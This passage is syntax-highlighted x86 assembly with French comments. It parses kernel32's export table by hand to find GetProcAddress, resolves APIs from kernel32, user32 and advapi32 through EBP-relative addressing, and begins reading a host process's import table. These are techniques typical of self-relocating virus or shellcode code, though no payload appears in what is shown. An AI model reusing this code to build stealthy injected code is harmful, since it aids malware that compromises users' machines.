    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; adresse du nom du module</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; on normalise</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"NREK"</span><span class="sc0">     </span><span class="sc1">; on a bien l'export table du Kernel ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">GetProcA_ERROR</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Tableau des Adresses des fonctions exportÈs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; (EN DWORDS)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fonctions</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Adresses des noms des fonctions exportÈs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Names</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Tableau des exported oridinals</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; (EN WORDS)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Ordinals</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; EAX sert de compteur</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Names</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; EDX pointe une RVA</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Next_API</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; la derniËre RVA ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">GetProcA_ERROR</span><span class="sc0">          </span><span class="sc1">; erreur...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EDI pointe le nom d'une API</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; on normalise</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NGetProcAddress</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ESI pointe le nom recherchÈ</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">compare</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmpsb</span><span class="sc0">                   </span><span class="sc1">; les 2 bytes sont pareils ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Inc_Compteur</span><span class="sc0">            </span><span class="sc1">; non ? on passe ‡ la fonction suivante</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; la chaÓne entiËre est valide</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">GetProcA_Found</span><span class="sc0">          </span><span class="sc1">; -&gt; hÈhÈ, on l'a !</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">compare</span><span class="sc0">             </span><span class="sc1">; sinon on prend la prochaine lettre</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Inc_Compteur</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; incrÈmente le compteur</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">; prochaine RVA</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Next_API</span><span class="sc0">            </span><span class="sc1">; on recherche de nouveau</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GetProcA_Found</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">; multiplie le compteur par 2 (WORDS)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Ordinals</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; choppe l'ordinal qui correspond</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EAX = L'Ordinal</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">; multiplie l'Ordinal par 4 (DWORDS)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fonctions</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Pointe l'adresse de GetProcAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EAX = RVA de GetProcAddress</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; on normalise</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetProcAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Et on sauve l'adresse de GetProcAddress</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GetProcA_ERROR</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GetProcA</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">;   GetAPIs PROC</span><span class="sc0">
</span><span class="sc1">;   input:      AGetProcAddress = adresse de GetProcAddress</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc5">GetAPIs</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Fonction qui rÈcupËre toutes les APIs dont nous avons besoin</span><span class="sc0">
</span><span class="sc1">; dans Kernel32.dll</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NExitProcess</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AExitProcess</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; On prÈpare la recherche des APIs</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">find_apis</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; Nom de l'API</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Module de Kernel32</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetProcAddress</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; API qui nous donne</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; l'adresse de l'API recherchÈe</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">on_se_trace</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">; copie l'adresse l‡ o˘ pointe EDI</span><span class="sc0">
                        </span><span class="sc1">; puis ajoute 4 ‡ EDI</span><span class="sc0">
</span><span class="sc5">choppe_prochaine_api</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; on choppe le prochain nom d'API</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">choppe_prochaine_api</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">        </span><span class="sc1">; On regarde si on est arrivÈ ‡ la fin</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">find_apis</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Fonction qui rÈcupËre toutes les APIs dont nous avons besoin</span><span class="sc0">
</span><span class="sc1">; dans User32.dll</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Nuser32</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; On prend l'ImageBase de user32.dll</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; grace ‡ GetModuleHandle.</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetModuleHandleA</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">on_se_trace</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">user32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; On stocke cette valeur dans user32.</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NMessageBoxA</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; On recherche en premier MessageBoxA</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AMessageBoxA</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">find_user_apis</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; On refait la mÍme chose qu'avec Kernel32</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">user32</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; pour trouver toutes les adresses des APIs</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetProcAddress</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; de user32.dll dont nous avons besoin</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">on_se_trace</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">; copie l'adresse l‡ o˘ pointe EDI</span><span class="sc0">
                        </span><span class="sc1">; puis ajoute 4 ‡ EDI</span><span class="sc0">
</span><span class="sc5">choppe_user_api</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; on choppe le prochain nom d'API</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">choppe_user_api</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">        </span><span class="sc1">; On regarde si on est arrivÈ ‡ la fin</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">find_user_apis</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Fonction qui rÈcupËre toutes les APIs dont nous avons besoin</span><span class="sc0">
</span><span class="sc1">; dans Advapi32.dll</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NAdvapi32</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; On prend l'ImageBase de NAdvapi32.dll</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; grace ‡ GetModuleHandle.</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetModuleHandleA</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">on_se_trace</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">advapi32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; On stocke cette valeur dans advapi32.</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NRegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; On recherche en premier RegOpenKeyExA</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">find_advapi_apis</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; On refait la mÍme chose qu'avec Kernel32</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">advapi32</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; pour trouver toutes les adresses des APIs</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetProcAddress</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; de advapi32.dll dont nous avons besoin</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">on_se_trace</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">; copie l'adresse l‡ o˘ pointe EDI</span><span class="sc0">
                        </span><span class="sc1">; puis ajoute 4 ‡ EDI</span><span class="sc0">
</span><span class="sc5">choppe_advapi_api</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; on choppe le prochain nom d'API</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">choppe_advapi_api</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">        </span><span class="sc1">; On regarde si on est arrivÈ ‡ la fin</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_advapi_apis</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">on_se_trace</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetAPIs</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">;   GetImportedApi PROC</span><span class="sc0">
</span><span class="sc1">;   input  :    EDI = adresse du nom de l'api ‡ rechercher</span><span class="sc0">
</span><span class="sc1">;   output :    EAX = adresse de l'API</span><span class="sc0">
</span><span class="sc1">;           EBX = pointeur sur l'adresse de l'API</span><span class="sc0">
</span><span class="sc1">;   Succes : EAX = adresse de l'API     Failed : EAX = 0</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc5">GetImportedApi</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetModuleHandleA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; choppe l'ImageBase</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; failed ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">GetImportedApi_ERROR</span><span class="sc0">        </span><span class="sc1">; erreur</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IMAGEBASE</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; On sauve la valeur</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IMAGEBASE</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; ImageBase du processus en ECX</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">        </span><span class="sc1">; vÈrification</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">GetImportedApi_ERROR</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; on situe le PE Header</span><span class="sc0">
